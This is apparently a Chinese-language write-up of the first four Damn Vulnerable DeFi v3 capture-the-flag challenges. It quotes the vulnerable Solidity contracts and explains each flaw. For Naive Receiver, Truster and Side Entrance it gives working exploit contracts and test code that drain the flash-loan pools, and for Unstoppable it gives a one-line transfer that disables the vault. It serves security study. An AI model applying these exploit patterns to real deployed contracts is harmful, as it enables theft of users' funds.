---
title: Damn Vulnerable DeFi V3
tags:
    - blockchain
    - smart contract
    - DeFi
    - flashloan
---

## How to Play

```bash
$ git clone git@github.com:tinchoabbate/damn-vulnerable-defi.git
$ cd damn-vulnerable-defi
$ git checkout v3.0.0
$ yarn install
```

- Code solution in the `test/<challenge-name>/<challenge-name>.challenge.js`
- `yarn run <challenge-name>`

## 1. Unstoppable

> There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
>
> To pass the challenge, make the vault stop offering flash loans.
>
> You start with 10 DVT tokens in balance.

- ERC4626 实现 ERC20 作为股权代币，`asset` 为 Vault 管理的底层代币
- `UnstoppableVault` 初始持有 $10^6$ DVT (ERC20) 和 $10^6$ oDVT (ERC4626)

    ```js
    // unstoppable.challenge.js
    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;

    await token.approve(vault.address, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);
    ```

    ```js
    // ERC4626.sol
    function convertToShares(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply;   // the totalSupply of oDVT
        // 当初始 totalSupply 为 0 时，deposit assets 得到同等数量的 shares
        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
        // (assets * supply) / totalAssets()
    }

    function previewDeposit(uint256 assets) public view virtual returns (uint256) {
        return convertToShares(assets);
    }

    function deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {
        require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

        // Need to transfer before minting or ERC777s could reenter.
        asset.safeTransferFrom(msg.sender, address(this), assets);

        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);

        afterDeposit(assets, shares);
    }
    ```

- 注意到 `convertToShares(totalSupply) != balanceBefore` 在使用依据 `totalSupply`(oDVT) 计算得到的 `shares` 和 `totalAssets()`(`UnstoppableVault` 的 DVT 余额) 进行比较，尽管在初始情况下没有问题，但是... (⃔ *`ω´ * )⃕↝
    - `totalSupply` 只能通过 `deposit` / `mint` 增加，而 `balanceBefore` 可通过 DVT 的 `transfer` 增加
    - 要将 `totalSupply` 转换成 `assets` 应使用 `convertToAssets`

    ```js
    // ReentrancyGuard.sol
    modifier nonReentrant() virtual {
        require(locked == 1, "REENTRANCY");

        locked = 2;

        _;

        locked = 1;
    }
    ```

    ```js
    // UnstoppableVault.sol
    function totalAssets() public view override returns (uint256) {
        assembly {
            // slot 0 对应 ReentrancyGuard 中的 locked
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0);
        if (address(asset) != _token) revert UnsupportedCurrency();
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();

        uint256 fee = flashFee(_token, amount);
        // SafeERC20 wrappers around ERC20 operations that throw on failure
        ERC20(_token).safeTransfer(address(receiver), amount);

        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();

        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        return true;
    }
    ```

- 向 `UnstoppableVault` 发送 DVT 使得 `convertToShares(totalSupply) == balanceBefore` 无法成立就可以阻止闪电贷啦 XD

    ```js
    it('Execution', async function () {
        // get the contracts with player as signer
        token = token.connect(player);

        await token.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    });
    ```

### 参考资料

- [ERC4626](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC4626)
- [BigInt - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt)

## 2. Naive Receiver

> There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
> 
> A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
> 
> Take all ETH out of the user’s contract. If possible, in a single transaction.

`FlashLoanReceiver.onFlashLoan()` 没有检查闪电贷的发起者 uwu 只好「帮」`FlashLoanReceiver` 发起闪电贷来消耗余额啦 :D

```js
// FlashLoanReceiver.sol
function onFlashLoan(
    address,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata
) external returns (bytes32) {
    assembly { // gas savings
        if iszero(eq(sload(pool.slot), caller())) {
            mstore(0x00, 0x48f5c3ed)
            revert(0x1c, 0x04)
        }
    }
    
    if (token != ETH) revert UnsupportedCurrency();
    
    uint256 amountToBeRepaid;
    unchecked {
        amountToBeRepaid = amount + fee;
    }

    _executeActionDuringFlashLoan();

    SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

### Exploit

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

contract NaiveReceiverHacker {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function exploit(address pool, address receiver) external {
        for (uint8 i = 0; i < 10; i ++) {
            IERC3156FlashLender(pool).flashLoan(
                IERC3156FlashBorrower(receiver), // receiver
                ETH,                             // token
                1 ether,                         // amount
                ""                               // data
            );
        }
    }
}
```

```js
it('Execution', async function () {
    let hacker = await (await ethers.getContractFactory("NaiveReceiverHacker")).deploy();
    await hacker.exploit(pool.address, receiver.address);
});
```

## 3. Truster

> The pool holds 1 million DVT tokens. You have nothing.
>
> To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

- `target.functionCall(data)` 可以以 `TrusterLenderPool` 的身份调用任意合约的任意函数

    ```js
    // TrusterLenderPool.sol
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
    ```

- 那就授权 `player` 使用 DVT 好了！(ΦˋωˊΦ)

    ```js
    it('Execution', async function () {
        let abi = ["function approve(address spender, uint256 amount)"];
        let iface = new ethers.utils.Interface(abi);
        await pool.connect(player).flashLoan(
            0,
            player.address,
            token.address,
            iface.encodeFunctionData("approve", [
                player.address,
                TOKENS_IN_POOL
            ]),
        );
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    });
    ```

### 参考资料

- [encodeABI to get call data with encoded parameters of contract method · Issue #478 · ethers-io/ethers.js](https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010)

## 4. Side Entrance

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
>
> It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
>
> Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

- `flashLoan()` 检查借贷前后 `SideEntranceLenderPool` 的余额，而 `deposit` 能够增加其余额并为 `msg.sender` 记账
- 可在 `flashLoan()` 时 `deposit()`，结束后 `withdraw()`

```js
// SideEntranceLenderPool.sol
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    
    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);

    SafeTransferLib.safeTransferETH(msg.sender, amount);
}

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore)
        revert RepayFailed();
}
```

### Exploit

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceHacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;

    constructor(address instance) {
        pool = SideEntranceLenderPool(instance);
    }

    function exploit() external payable {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        payable(tx.origin).transfer(1000 ether);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}
```

```js
it('Execution', async function () {
    let hacker = await (await ethers.getContractFactory('SideEntranceHacker', player)).deploy(pool.address);
    await hacker.exploit();
});
```